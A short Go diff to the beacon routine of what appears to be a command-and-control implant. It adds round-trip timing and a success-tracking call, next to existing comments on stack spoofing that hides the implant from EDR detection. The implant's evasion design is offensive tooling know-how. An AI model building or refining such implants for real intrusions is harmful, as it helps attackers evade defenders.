@@ -192,6 +192,7 @@ func doBeacon() {
 	// call stack when useStackSpoofing is active, hiding the implant's Go
 	// routines from userland stack-walk based EDR attribution.
 	var respBody []byte
+	sendStarted := time.Now()
 	runBeaconSendSpoofed(func() {
 		curProto, curBT := getProtocol(), getBeaconTransport()
 		switch {
@@ -247,6 +248,10 @@ func doBeacon() {
 			respBody = sendWithMode(sendBody)
 		}
 	})
+	// One RTT sample per exchange, no extra packets. The observed loss is for
+	// the transport only; a decrypted-but-rejected envelope still counts as a
+	// response (the server was reached) and is handled by its own paths.
+	observeBeaconResult(time.Since(sendStarted), respBody != nil)
 	if respBody != nil {
 		noteTransportSuccess()
 	} else {
